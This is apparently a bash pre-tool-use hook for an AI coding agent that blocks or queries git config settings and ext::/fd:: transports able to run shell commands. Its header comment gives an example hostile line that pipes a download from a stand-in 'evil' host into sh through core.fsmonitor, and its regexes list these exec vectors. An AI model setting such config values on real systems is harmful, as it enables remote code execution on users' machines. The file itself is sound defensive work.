#!/usr/bin/env bash
# Claude Supercharger — Git Config Exec Guard
# Event: PreToolUse | Matcher: Bash
#
# `git config` (or `git -c KEY=VAL`) can set an EXEC-CAPABLE config key that turns
# the next ordinary git command into arbitrary shell execution — core.fsmonitor,
# core.sshCommand, credential.helper, core.pager/editor, alias.x '!sh', filter.*
# clean/smudge, diff.*.command, difftool/mergetool.*.cmd, sequence.editor, and a
# PERSISTENT core.hooksPath redirect. `git config core.fsmonitor '!curl evil|sh'`
# fires on the next `git status`. git-safety blocks only the INLINE `-c core.hooksPath=`
# verification-bypass form; the whole persistent-config exec family was open
# (CVE-2026-55607 fsmonitor + the git-credential-helper CVE cluster). ASKS (these
# keys are frequently legit: credential.helper=store, core.pager=less, benign
# aliases) — DENYs only the always-malicious subset (fsmonitor, command-valued
# sshCommand). Asks once per key per session. Advisory + fail-open; disable with
# SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0.
#
# Also DENYs the `ext::`/`fd::` remote-helper TRANSPORT (git runs a shell command at
# clone/fetch/remote time — no config key, no hooks) and `protocol.ext.allow=always`
# which re-enables it. Never legitimate in agent-driven work; near-zero FP.
# (simple-git CVE-2026-28292 CVSS 9.8, n8n CVE-2026-25053.)
set -uo pipefail
HOOKS_DIR="${BASH_SOURCE[0]%/*}"
# shellcheck source=hooks/lib-suppress.sh
. "$HOOKS_DIR/lib-suppress.sh" 2>/dev/null || true

[ "${SUPERCHARGER_GIT_CONFIG_EXEC_GUARD:-1}" = "0" ] && exit 0

_INPUT=$(cat)

# Fast-path: needs git AND a config-setting OR transport-helper form. Superset.
case "$_INPUT" in *git*) : ;; *) exit 0 ;; esac
case "$_INPUT" in *config*|*"-c "*|*"-c\\\""*|*"ext::"*|*"fd::"*|*"protocol."*) : ;; *) exit 0 ;; esac

check_hook_disabled "git-config-exec-guard" 2>/dev/null && exit 0
hook_profile_skip "git-config-exec-guard" 2>/dev/null && exit 0

CMD=$(printf '%s\n' "$_INPUT" | jq -r '.tool_input.command // .tool_input.script // empty' 2>/dev/null || true)
if [ -z "$CMD" ]; then
  CMD=$(printf '%s\n' "$_INPUT" | python3 -c "import sys,json;ti=json.load(sys.stdin).get('tool_input',{});print(ti.get('command') or ti.get('script') or '')" 2>/dev/null || echo "")
fi
[ -z "$CMD" ] && exit 0

# Classify in python (regex-heavy → temp-file redirect, not $(python <<EOF) which
# bash 3.2's command-sub parser mis-scans on paren/quote-dense bodies).
_GCE_OUT=$(mktemp 2>/dev/null) || _GCE_OUT="${TMPDIR:-/tmp}/gce.$$"
CMD_IN="$CMD" python3 > "$_GCE_OUT" 2>/dev/null <<'PYEOF'
import os, re, sys

cmd = os.environ.get("CMD_IN", "")

# A value that is SHELL-COMMAND-shaped (vs a plain program name / keyword).
CMD_SHAPE = re.compile(
    r'(^\s*!|\$\(|`|;|\||&&|\bsh\s+-c\b|\bbash\s+-c\b|\bzsh\s+-c\b|\bnode\s+-e\b|'
    r'\bpython3?\s+-c\b|\bperl\s+-e\b|\bruby\s+-e\b|/\S+\.(?:sh|py|rb|pl|js|ps1))',
    re.I)

def keyclass(key, val):
    """Return (verdict, label) or None. verdict in {DENY, ASK}."""
    k = key.lower()
    cmdshaped = bool(CMD_SHAPE.search(val))
    # Always an executable command — no benign form.
    if k == "core.fsmonitor":
        return ("DENY", "core.fsmonitor (runs on every git op)")
    if re.match(r'(filter\.[^.]+\.(clean|smudge)|diff\.[^.]+\.command|'
                r'(difftool|mergetool)\.[^.]+\.cmd)$', k):
        return ("ASK", key)
    # Persistent hooks redirect = verification/attack-hook bypass.
    if k == "core.hookspath":
        return ("ASK", "core.hooksPath (redirects git hooks)")
    # sshCommand: command-shaped value is an exec gadget → DENY.
    if k == "core.sshcommand":
        return (("DENY" if cmdshaped else None), "core.sshCommand") if cmdshaped else None
    # Aliases exec a shell only when '!'-prefixed.
    if k.startswith("alias."):
        return ("ASK", key) if val.lstrip().startswith("!") else None
    # Sometimes-legit keys: flag only when the value is command-shaped.
    if k in ("core.pager", "core.editor", "credential.helper", "sequence.editor",
             "core.askpass", "diff.external", "gpg.program", "uploadpack", "receivepack"):
        return ("ASK", key) if cmdshaped else None
    return None

def emit(v):
    if not v:
        return
    verdict, label = v
    print("%s|%s" % (verdict, label))
    raise SystemExit

# Transport helpers: `ext::`/`fd::` run a shell command at clone/fetch/remote time.
# Match only when the token STARTS a URL argument (preceded by start/space/quote/=),
# so paths like `.../ext::x` or `context::y` don't false-fire. Gated on a git cmd.
if re.search(r'\bgit\b', cmd):
    if re.search(r'''(?:^|[\s"'=])(?:ext|fd)::''', cmd):
        emit(("DENY", "ext::/fd:: transport (runs a shell command at clone/fetch)"))
    if re.search(r'protocol\.(?:ext|file)\.allow\s*=\s*always', cmd, re.I):
        emit(("DENY", "protocol.*.allow=always (re-enables the ext:: transport)"))

# Form 1: git config [--flags] <key> <value...>   (value runs to end / ; / && / |)
for m in re.finditer(r'git\s+config\s+((?:--\S+\s+)*)([\w][\w.-]*)\s+(.+)', cmd):
    key = m.group(2)
    rest = m.group(3)
    # value = up to an unquoted command separator; strip surrounding quotes.
    val = re.split(r'(?<!\\)[;&|]', rest, 1)[0].strip()
    if (val.startswith('"') and val.endswith('"')) or (val.startswith("'") and val.endswith("'")):
        val = val[1:-1]
    emit(keyclass(key, val))

# Form 2: git -c <key>=<value>
for m in re.finditer(r'git\s+(?:[^|;&]*\s)?-c\s+([\w][\w.-]*)=(\S+)', cmd):
    emit(keyclass(m.group(1), m.group(2)))
PYEOF
_RESULT=$(cat "$_GCE_OUT" 2>/dev/null); rm -f "$_GCE_OUT" 2>/dev/null
[ -z "$_RESULT" ] && exit 0

_VERDICT="${_RESULT%%|*}"
_LABEL="${_RESULT#*|}"

# Ask/deny once per key per session.
SID=$(printf '%s\n' "$_INPUT" | jq -r '.session_id // empty' 2>/dev/null || true); [ -z "$SID" ] && SID="${CLAUDE_CODE_SESSION_ID:-default}"
_SEEN="${SUPERCHARGER_STATE:-$HOME/.claude/supercharger}/scope/.gitcfgexec-seen-${SID}"
if [ -f "$_SEEN" ] && grep -qxF "$_VERDICT:$_LABEL" "$_SEEN" 2>/dev/null; then
  exit 0
fi
mkdir -p "$(dirname "$_SEEN")" 2>/dev/null || true
echo "$_VERDICT:$_LABEL" >> "$_SEEN" 2>/dev/null || true

if [ "$_VERDICT" = "DENY" ]; then
  _MSG="Blocked: ${_LABEL} — git would run a shell command at a git operation (arbitrary code execution; CVE-2026-55607 fsmonitor / CVE-2026-28292 ext:: transport class). If you truly need this, run it yourself in the terminal. (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
  RSN=$(printf '%s' "$_MSG" | jq -Rs '.' 2>/dev/null || printf '"%s"' "$_MSG")
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":%s}}\n' "$RSN"
  echo "[Supercharger] git-config-exec-guard: DENY exec-capable git (${_LABEL})" >&2
  exit 2
fi

_MSG="This sets the git config key ${_LABEL}, which git can execute as a command on a later git operation — a common RCE/persistence vector. Confirm it's an intended, trusted value (e.g. credential.helper=store, core.pager=less are fine; a '!'-shell or script path is the risk). (Disable: SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0)"
RSN=$(printf '%s' "$_MSG" | jq -Rs '.' 2>/dev/null || printf '"%s"' "$_MSG")
printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":%s}}\n' "$RSN"
echo "[Supercharger] git-config-exec-guard: ASK exec-capable git config (${_LABEL})" >&2
exit 0
